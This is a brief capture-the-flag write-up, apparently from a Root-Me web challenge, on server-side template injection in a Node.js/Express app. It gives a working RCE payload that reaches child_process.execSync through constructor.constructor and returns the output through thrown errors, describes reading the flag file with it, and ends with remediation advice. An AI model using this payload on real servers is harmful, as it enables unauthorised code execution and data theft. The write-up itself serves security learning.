### Vulnerability: Server-Side Template Injection (SSTI) → Remote Code Execution

**Target:** `http://challenge01.root-me.org:59039/` (Node.js / Express)

**Root cause:** The `salary` POST parameter is concatenated directly into a server-side template rather than being passed as template data, so the `{{ }}` syntax of the Ejs-like template engine evaluates attacker-supplied expressions as JavaScript.

**Exploitation chain:**

1. **Detect** — `salary={{7*7}}` returned `49` in the "Remainder" field → arithmetic evaluated server-side (SSTI confirmed).

2. **Identify / escalate to RCE** — the engine exposes `constructor.constructor`, so `Function()` is reachable. Direct `execSync` output was swallowed (parsed as number → `NaN`), but the app reflects exception messages, so wrapping the output in a `throw new Error(...)` exfiltrates the result:

   ```
   POST / HTTP/1.1
   Content-Type: application/x-www-form-urlencoded

   salary={{constructor.constructor('throw new Error(global.process.mainModule.require("child_process").execSync("id").toString())')()}}
   ```
   → `Error: uid=1171(web-serveur-ch39) ...` (RCE confirmed).

3. **Flag retrieval** — enumerated `/challenge/web-serveur/ch39/`, found a hidden folder `??????????????????????????`, and `cat`ed it via the same RCE primitive.

### Remediation
Render user input strictly as **template data** (e.g. `res.render('view', { salary: req.body.salary })`), never build the template string from input; and disable / sandbox code-evaluation features of the template engine. Validate that `salary` (and all fields) are numeric via a schema before use.
